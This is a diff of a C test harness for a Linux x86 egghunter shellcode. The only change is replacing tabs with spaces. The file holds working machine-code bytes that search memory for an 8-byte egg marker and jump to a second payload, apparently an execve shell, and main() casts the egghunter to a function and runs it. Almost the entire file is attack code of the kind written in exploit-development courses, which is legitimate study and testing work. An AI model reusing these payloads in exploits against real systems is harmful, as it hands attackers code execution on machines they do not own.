@@ -4,21 +4,21 @@
 #define EGG	"\x90\x50\x90\x50"
 
 unsigned char egghunter[] = \
-"\x66\x81\xc9\xff\x0f"	// or     cx,0xfff
-"\x41"					// inc    ecx
-"\x6a\x43"				// push   0x43
-"\x58"					// pop    eax
-"\xcd\x80"				// int    0x80
-"\x3c\xf2"				// cmp    al,0xf2
-"\x74\xf1"				// je     align_page
+"\x66\x81\xc9\xff\x0f"  // or     cx,0xfff
+"\x41"                  // inc    ecx
+"\x6a\x43"              // push   0x43
+"\x58"                  // pop    eax
+"\xcd\x80"              // int    0x80
+"\x3c\xf2"              // cmp    al,0xf2
+"\x74\xf1"              // je     align_page
 "\xb8" 
-EGG 					// mov    eax,0x50905090
-"\x89\xcf"				// mov    edi,ecx
-"\xaf"					// scas   eax,DWORD PTR es:[edi]
-"\x75\xec"				// jne    next_address
-"\xaf"					// scas   eax,DWORD PTR es:[edi]
-"\x75\xe9"				// jne    next_address
-"\xff\xe7";				// jmp    edi
+EGG                     // mov    eax,0x50905090
+"\x89\xcf"              // mov    edi,ecx
+"\xaf"                  // scas   eax,DWORD PTR es:[edi]
+"\x75\xec"              // jne    next_address
+"\xaf"                  // scas   eax,DWORD PTR es:[edi]
+"\x75\xe9"              // jne    next_address
+"\xff\xe7";             // jmp    edi
 
 unsigned char code[] = \
 EGG
@@ -31,8 +31,8 @@ EGG
 "\x89\xe2\xb0\x0b\xcd\x80";
 
 int main(void) {
-	printf("Shellcode ength + 8 byte egg:  %d\n", strlen(code));
-	printf("Egg hunter length: %d\n", strlen(egghunter));
-	int (*ret)() = (int(*)())egghunter;
-	ret();
+    printf("Shellcode ength + 8 byte egg:  %d\n", strlen(code));
+    printf("Egg hunter length: %d\n", strlen(egghunter));
+    int (*ret)() = (int(*)())egghunter;
+    ret();
 }
